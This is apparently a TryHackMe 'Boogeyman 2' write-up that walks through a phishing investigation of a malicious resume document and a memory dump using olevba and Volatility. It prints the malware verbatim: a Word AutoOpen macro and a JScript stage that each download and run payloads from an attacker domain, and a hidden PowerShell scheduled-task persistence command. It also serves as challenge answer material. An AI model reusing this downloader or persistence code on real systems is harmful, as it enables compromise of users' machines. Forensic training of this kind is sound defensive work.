# [TryHackMe | Boogeyman 2](https://tryhackme.com/room/boogeyman2) Challenge Room Solution Writeup

## [Task 2 | Spear Phishing Human Resources](https://tryhackme.com/room/boogeyman2?taskNo=2)

Open `Resume - Application for Junior IT Analyst Role.eml` in `Evolution Mail and Calender`.

### What email was used to send the phishing email?

Inspect the email to find **westaylor23@outlook[.]com**.

### What is the email of the victim employee?

Inspect the email to find **maxine.beck@quicklogisticsorg[.]onmicrosoft[.]com**.

### What is the name of the attached malicious document?

Inspect the email to find **Resume_WesleyTaylor.doc** and save it.

### What is the MD5 hash of the malicious attachment?

Run `md5sum Resume_WesleyTaylor.doc` in `terminal` to get **52c4384a0b9e248b95804352ebec6c5b**.

### What URL is used to download the stage 2 payload based on the document's macro?

Use `Olevba ` to inspect the malicious attachment.

```
olevba Resume_WesleyTaylor.doc 

olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Resume_WesleyTaylor.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With

Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Adodb.Stream        |May create a text file                       |
|Suspicious|savetofile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Microsoft.XMLHTTP   |May download files from the Internet         |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://files.boogey|URL                                          |
|          |manisback.lol/aa2a9c|                                             |
|          |53cbb80416d3b47d8553|                                             |
|          |8d9971/update.png   |                                             |
|IOC       |update.js           |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

The report lists an IOC with URL **https[:]//files[.]boogeymanisback[.]lol/aa2a9c53cbb80416d3b47d85538d9971/update[.]png**.

### What is the name of the process that executed the newly downloaded stage 2 payload?

The line `shell_object.Exec ("wscript.exe C:\ProgramData\update.js")` reveals the executed process **wscript.exe**.

### What is the full file path of the malicious stage 2 payload?

From the previous question, the path is **C:\ProgramData\update.js**.

### What is the PID of the process that executed the stage 2 payload?

Use `Volatility` to inspect the memory dump of the victim's workstation.

```bash
vol -f WKSTN-2961.raw windows.pstree.PsTree

Volatility 3 Framework 2.5.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime

4	0	System	0xe58f7e675080	168	-	N/A	False	2023-08-21 13:45:50.000000 	N/A
* 1472	4	MemCompression	0xe58f84b41040	30	-	N/A	False	2023-08-21 13:46:50.000000 	N/A
* 84	4	Registry	0xe58f7e765040	4	-	N/A	False	2023-08-21 13:45:34.000000 	N/A
* 340	4	smss.exe	0xe58f81466040	2	-	N/A	False	2023-08-21 13:45:50.000000 	N/A
436	424	csrss.exe	0xe58f8399d080	10	-	0	False	2023-08-21 13:46:27.000000 	N/A
508	424	wininit.exe	0xe58f83ae1080	1	-	0	False	2023-08-21 13:46:27.000000 	N/A
* 660	508	lsass.exe	0xe58f83b89080	8	-	0	False	2023-08-21 13:46:30.000000 	N/A
* 644	508	services.exe	0xe58f82970080	5	-	0	False	2023-08-21 13:46:30.000000 	N/A
** 2176	644	svchost.exe	0xe58f84df7240	8	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 388	644	svchost.exe	0xe58f849712c0	32	-	0	False	2023-08-21 13:46:45.000000 	N/A
*** 7132	388	rdpclip.exe	0xe58f864e6080	11	-	3	False	2023-08-21 14:06:32.000000 	N/A
** 1540	644	svchost.exe	0xe58f84a920c0	9	-	0	False	2023-08-21 13:46:50.000000 	N/A
*** 3892	1540	audiodg.exe	0xe58f88b60080	4	-	0	False	2023-08-21 14:08:38.000000 	N/A
** 780	644	svchost.exe	0xe58f8656b480	10	-	3	False	2023-08-21 14:06:33.000000 	N/A
** 1040	644	svchost.exe	0xe58f849eb2c0	15	-	0	False	2023-08-21 13:46:46.000000 	N/A
** 1680	644	svchost.exe	0xe58f84c0a2c0	4	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 1424	644	SecurityHealth	0xe58f87a84080	8	-	0	False	2023-08-21 13:55:59.000000 	N/A
** 1048	644	svchost.exe	0xe58f849ec2c0	23	-	0	False	2023-08-21 13:46:46.000000 	N/A
** 4120	644	svchost.exe	0xe58f84a7b2c0	6	-	3	False	2023-08-21 14:06:34.000000 	N/A
** 1056	644	svchost.exe	0xe58f849f02c0	17	-	0	False	2023-08-21 13:46:46.000000 	N/A
** 420	644	svchost.exe	0xe58f84972080	45	-	0	False	2023-08-21 13:46:45.000000 	N/A
*** 4248	420	taskhostw.exe	0xe58f87604480	8	-	3	False	2023-08-21 14:06:33.000000 	N/A
*** 6300	420	sihost.exe	0xe58f87ade080	9	-	3	False	2023-08-21 14:06:33.000000 	N/A
** 1064	644	svchost.exe	0xe58f849f22c0	3	-	0	False	2023-08-21 13:46:46.000000 	N/A
** 1960	644	svchost.exe	0xe58f84c0c080	4	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 1836	644	svchost.exe	0xe58f84cd8240	15	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 1716	644	spoolsv.exe	0xe58f84da0200	7	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 1336	644	svchost.exe	0xe58f864ae080	8	-	0	False	2023-08-21 13:49:02.000000 	N/A
** 828	644	svchost.exe	0xe58f84804240	13	-	0	False	2023-08-21 13:46:37.000000 	N/A
*** 448	828	WmiPrvSE.exe	0xe58f863b80c0	3	-	0	False	2023-08-21 13:50:52.000000 	N/A
*** 5508	828	SystemSettings	0xe58f874ea0c0	0	-	2	False	2023-08-21 13:58:42.000000 	2023-08-21 13:59:27.000000 
*** 5476	828	SystemSettings	0xe58f86458080	0	-	2	False	2023-08-21 13:56:49.000000 	2023-08-21 13:57:03.000000 
*** 6724	828	RuntimeBroker.	0xe58f876d8080	2	-	3	False	2023-08-21 14:06:38.000000 	N/A
*** 3364	828	RuntimeBroker.	0xe58f87af6080	1	-	3	False	2023-08-21 14:06:42.000000 	N/A
*** 1096	828	RuntimeBroker.	0xe58f81551080	2	-	3	False	2023-08-21 14:06:39.000000 	N/A
*** 4424	828	smartscreen.ex	0xe58f87898080	5	-	3	False	2023-08-21 14:06:51.000000 	N/A
*** 3304	828	RuntimeBroker.	0xe58f863cb080	4	-	3	False	2023-08-21 14:08:41.000000 	N/A
*** 4776	828	WmiPrvSE.exe	0xe58f875020c0	9	-	0	False	2023-08-21 14:12:34.000000 	N/A
*** 6480	828	StartMenuExper	0xe58f861b5080	8	-	3	False	2023-08-21 14:06:37.000000 	N/A
*** 7120	828	SearchUI.exe	0xe58f87e7e080	32	-	3	False	2023-08-21 14:06:38.000000 	N/A
*** 4784	828	SecurityHealth	0xe58f87edc080	1	-	3	False	2023-08-21 14:08:41.000000 	N/A
*** 1396	828	ShellExperienc	0xe58f84f1e080	13	-	3	False	2023-08-21 14:08:41.000000 	N/A
*** 5020	828	WindowsInterna	0xe58f87ab90c0	9	-	3	False	2023-08-21 14:07:35.000000 	N/A
** 1852	644	SgrmBroker.exe	0xe58f86364080	3	-	0	False	2023-08-21 13:49:02.000000 	N/A
** 4156	644	svchost.exe	0xe58f810ac080	3	-	0	False	2023-08-21 13:56:51.000000 	N/A
** 1600	644	svchost.exe	0xe58f84c402c0	11	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 3912	644	SearchIndexer.	0xe58f864b90c0	14	-	0	False	2023-08-21 13:49:03.000000 	N/A
*** 6720	3912	SearchFilterHo	0xe58f8114f080	5	-	0	False	2023-08-21 14:12:33.000000 	N/A
*** 6592	3912	SearchProtocol	0xe58f8635f080	0	-	0	False	2023-08-21 14:12:38.000000 	2023-08-21 14:15:07.000000 
** 588	644	svchost.exe	0xe58f84a64080	4	-	0	False	2023-08-21 13:48:48.000000 	N/A
** 2256	644	amazon-ssm-age	0xe58f84e70280	11	-	0	False	2023-08-21 13:46:51.000000 	N/A
*** 3372	2256	ssm-agent-work	0xe58f86460380	11	-	0	False	2023-08-21 13:47:07.000000 	N/A
**** 3380	3372	conhost.exe	0xe58f7e674080	4	-	0	False	2023-08-21 13:47:07.000000 	N/A
** 2384	644	MsMpEng.exe	0xe58f84ed1340	9	-	0	False	2023-08-21 13:46:52.000000 	N/A
** 1108	644	svchost.exe	0xe58f876c6080	3	-	0	False	2023-08-21 14:06:29.000000 	N/A
** 2396	644	Ec2Config.exe	0xe58f84ed2080	21	-	0	False	2023-08-21 13:46:52.000000 	N/A
** 4060	644	svchost.exe	0xe58f865a62c0	7	-	0	False	2023-08-21 13:47:14.000000 	N/A
** 4192	644	svchost.exe	0xe58f8762b240	1	-	0	False	2023-08-21 13:53:50.000000 	N/A
** 2408	644	OfficeClickToR	0xe58f84f04340	15	-	0	False	2023-08-21 13:46:52.000000 	N/A
** 5480	644	WUDFHost.exe	0xe58f879130c0	10	-	0	False	2023-08-21 14:06:28.000000 	N/A
** 876	644	svchost.exe	0xe58f84821080	9	-	0	False	2023-08-21 13:46:40.000000 	N/A
** 1140	644	svchost.exe	0xe58f849ac080	18	-	0	False	2023-08-21 13:46:47.000000 	N/A
** 2164	644	svchost.exe	0xe58f865d9080	4	-	0	False	2023-08-21 13:56:46.000000 	N/A
** 1656	644	svchost.exe	0xe58f84c55080	3	-	0	False	2023-08-21 13:46:51.000000 	N/A
** 892	644	svchost.exe	0xe58f849a6240	16	-	0	False	2023-08-21 13:46:45.000000 	N/A
*** 4008	892	ctfmon.exe	0xe58f81557080	9	-	3	False	2023-08-21 14:06:33.000000 	N/A
* 740	508	fontdrvhost.ex	0xe58f83bb5080	5	-	0	False	2023-08-21 13:46:36.000000 	N/A
524	500	csrss.exe	0xe58f83ae0080	10	-	1	False	2023-08-21 13:46:27.000000 	N/A
576	500	winlogon.exe	0xe58f83b18080	2	-	1	False	2023-08-21 13:46:27.000000 	N/A
* 956	576	dwm.exe	0xe58f848f0080	13	-	1	False	2023-08-21 13:46:44.000000 	N/A
* 772	576	fontdrvhost.ex	0xe58f83bbd180	5	-	1	False	2023-08-21 13:46:36.000000 	N/A
* 2332	576	LogonUI.exe	0xe58f862f1080	15	-	1	False	2023-08-21 13:46:56.000000 	N/A
824	3068	explorer.exe	0xe58f8756b080	0	-	2	False	2023-08-21 13:53:49.000000 	2023-08-21 14:01:08.000000 
5916	4296	csrss.exe	0xe58f860384c0	11	-	3	False	2023-08-21 14:06:26.000000 	N/A
4320	4296	winlogon.exe	0xe58f87b734c0	4	-	3	False	2023-08-21 14:06:26.000000 	N/A
* 4168	4320	fontdrvhost.ex	0xe58f87ca7080	5	-	3	False	2023-08-21 14:06:28.000000 	N/A
* 4580	4320	dwm.exe	0xe58f864bb080	15	-	3	False	2023-08-21 14:06:28.000000 	N/A
* 3948	4320	userinit.exe	0xe58f87788080	0	-	3	False	2023-08-21 14:06:33.000000 	2023-08-21 14:07:00.000000 
** 596	3948	explorer.exe	0xe58f87e31080	46	-	3	False	2023-08-21 14:06:34.000000 	N/A
*** 1440	596	OUTLOOK.EXE	0xe58f87c8a080	22	-	3	False	2023-08-21 14:09:04.000000 	N/A
**** 1124	1440	WINWORD.EXE	0xe58f81150080	18	-	3	False	2023-08-21 14:12:31.000000 	N/A
***** 4336	1124	WINWORD.EXE	0xe58f87547080	0	-	3	False	2023-08-21 14:12:34.000000 	2023-08-21 14:12:45.000000 
***** 4260	1124	wscript.exe	0xe58f864ca0c0	6	-	3	False	2023-08-21 14:12:47.000000 	N/A
****** 6216	4260	updater.exe	0xe58f87ac0080	18	-	3	False	2023-08-21 14:12:48.000000 	N/A
******* 4464	6216	conhost.exe	0xe58f84bd1080	5	-	3	False	2023-08-21 14:14:03.000000 	N/A
*** 6132	596	msedge.exe	0xe58f876d7080	0	-	3	False	2023-08-21 14:06:51.000000 	2023-08-21 14:06:56.000000 
*** 6932	596	cmd.exe	0xe58f87c230c0	1	-	3	False	2023-08-21 14:09:01.000000 	N/A
**** 6332	6932	DumpIt.exe	0xe58f87a870c0	3	-	3	True	2023-08-21 14:14:25.000000 	N/A
**** 6052	6932	conhost.exe	0xe58f87677080	4	-	3	False	2023-08-21 14:09:01.000000 	N/A
```

Inspect the output to find the PID for `wscript.exe` of **4260**.

### What is the parent PID of the process that executed the stage 2 payload?

Follow the tree to find a parent PID of **1124**.

### What URL is used to download the malicious binary executed by the stage 2 payload?

Search for files containing "uptate".

```bash
vol -f WKSTN-2961.raw windows.filescan | grep -i update

0xe58f81036ea0.0\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpasdlta.vdm	216
0xe58f8103fe60	\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpavdlta.vdm	216
0xe58f810484c0	\ProgramData\USOShared\Logs\System\UpdateSessionOrchestration.4d2c40dc-ea2f-49fa-a806-5f6e3f5b23ba.1.etl	216
0xe58f810e3400	\ProgramData\Microsoft\Windows Defender\Definition Updates\{15DCDDB9-6D64-4FBF-B930-E29F3651153A}\mpavbase.vdm	216
0xe58f836edc60	\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\IE\GEX3PLZ6\update[1].png	216
0xe58f862d7bf0	\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpasdlta.vdm	216
0xe58f862e43f0	\ProgramData\Microsoft\Windows Defender\Definition Updates\{15DCDDB9-6D64-4FBF-B930-E29F3651153A}\mpasbase.vdm	216
0xe58f86474330	\Windows\System32\winevt\Logs\Microsoft-Windows-WindowsUpdateClient%4Operational.evtx	216
0xe58f88193410	\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpasdlta.vdm	216
0xe58f88194220	\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpavdlta.vdm	216
0xe58f881943b0	\ProgramData\Microsoft\Windows Defender\Definition Updates\{C3C30F79-EB4B-4A24-B76B-7950F59F6BD2}\mpavbase.vdm	216
0xe58f8928f8b0	\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\IE\FMJK14EZ\update[1].exe	216
0xe58f89291e30	\Windows\Tasks\updater.exe	216
0xe58f89293730	\Windows\Tasks\updater.exe	216
0xe58f89295990	\Windows\System32\Tasks\Updater	216
0xe58f89296c50	\Windows\Prefetch\UPDATER.EXE-F25601BD.pf	216
```

Dump the file `0xe58f836edc60 \Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\IE\GEX3PLZ6\update[1].png	216`, then read it.

```bash
vol -f WKSTN-2961.raw -o . windows.dumpfiles --virtaddr 0xe58f836edc60

Volatility 3 Framework 2.5.0
Progress:  100.00		PDB scanning finished                        
Cache	FileObject	FileName	Result

DataSectionObject	0xe58f836edc60	update[1].png	file.0xe58f836edc60.0xe58f87ddb320.DataSectionObject.update[1].png.dat

cat file.0xe58f836edc60.0xe58f87ddb320.DataSectionObject.update\[1\].png.dat 

var Object = WScript.CreateObject('MSXML2.XMLHTTP');
var wshell = new ActiveXObject("WScript.Shell");

var location = "C:\\Windows\\Tasks\\";
var filename = "updater.exe";

var url = "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe"
Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
 var Stream = WScript.CreateObject('ADODB.Stream');
 Stream.Open();
 Stream.Type = 1; // Stream type 1 to set binary stream
 Stream.Write(Object.ResponseBody);
 Stream.Position = 0;
 Stream.SaveToFile(location + filename, 2); // option 2 to force overwrite
 Stream.Close();
}

wshell.Run("cmd.exe /c reg.exe add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\" /v C:\\Windows\\Tasks /f");


wshell.Run(location + filename);
WScript.Sleep(5*60*1000);
```

The URL used for downloading is **https[:]//files[.]boogeymanisback[.]lol/aa2a9c53cbb80416d3b47d85538d9971/update[.]exe**.

### What is the PID of the malicious process used to establish the C2 connection?

Returning to the process tree report, the PID for `updater.exe` is **6216**.

### What is the full file path of the malicious process used to establish the C2 connection?

The full path may be reconstructed as **C:\\Windows\\Tasks\\updater.exe**.

### What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)

Search for network activity corresponding to `uptater.exe`.

```bash
vol -f WKSTN-2961.raw windows.netscan | grep -i updater.exe

0xe58f812ab6b0.0UDPv4	0.0.0.0n0ing fin*shed   0               6216    updater.exe	2023-08-21 14:12:48.000000 
0xe58f84d95010	TCPv4	10.10.49.181	63299	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:26.000000 
0xe58f86455010	TCPv4	10.10.49.181	63350	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:16:11.000000 
0xe58f86b1b770	TCPv4	10.10.49.181	63331	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:15:17.000000 
0xe58f86b73010	TCPv4	10.10.49.181	63308	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:39.000000 
0xe58f86b9ebf0	TCPv4	10.10.49.181	63291	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:13.000000 
0xe58f8741ebf0	TCPv4	10.10.49.181	63348	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:16:05.000000 
0xe58f8760dbf0	TCPv4	10.10.49.181	63298	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:24.000000 
0xe58f8797fc40	UDPv4	0.0.0.0	0	*	0		6216	updater.exe	2023-08-21 14:12:48.000000 
0xe58f87980180	UDPv4	0.0.0.0	0	*	0		6216	updater.exe	2023-08-21 14:12:48.000000 
0xe58f87980180	UDPv6	::	0	*	0		6216	updater.exe	2023-08-21 14:12:48.000000 
0xe58f87980570	UDPv4	0.0.0.0	0	*	0		6216	updater.exe	2023-08-21 14:12:48.000000 
0xe58f87980570	UDPv6	::	0	*	0		6216	updater.exe	2023-08-21 14:12:48.000000 
0xe58f87e81bf0	TCPv4	10.10.49.181	63339	128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:15:40.000000 
```

The IP address and port are **128.199.95.189:8080**.

### What is the full file path of the malicious email attachment based on the memory dump?

```bash
vol -f WKSTN-2961.raw windows.filescan | grep -i resume

0xe58f86465740.0\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc	216
0xe58f878c1420	\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc	216
```

The full file path is **C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc**.

### The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?

Search for the creation of a scheduled task.

```bash
strings WKSTN-2961.raw | grep -i "schtasks /create"

.run "cmd.exe  /c echo " & chr(powershell.exe [io.file]::writeallbytes(schtasks /create /f /sc minute /mo 3 /tn.run "cmd.exe  /c echo " & "set
Schtasks /Create /tn "%s"@
schtasks /create /sc minuQ
SCHTASKS /CREATE /SC ONLOGON 
BkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGgAbABGAEsAcwBBAE8AagA9AFkAYgBNAEwANwAxAGsAUgBtAEsAZQBBADUAMAAzAE0AOABWAGoAcwA4AFcAOABXADQAZgBZAD0AIgApADsAJABkAGEAdABhAD0AJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACQAcwBlAHIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABkAGEAdABhAFsANAAuAC4AJABkAGEAdABhAC4AbABlAG4AZwB0AGgAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=;schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"';'Schtasks persistence established using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater daily trigger at 09:00.'
```

The full command is **schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'**.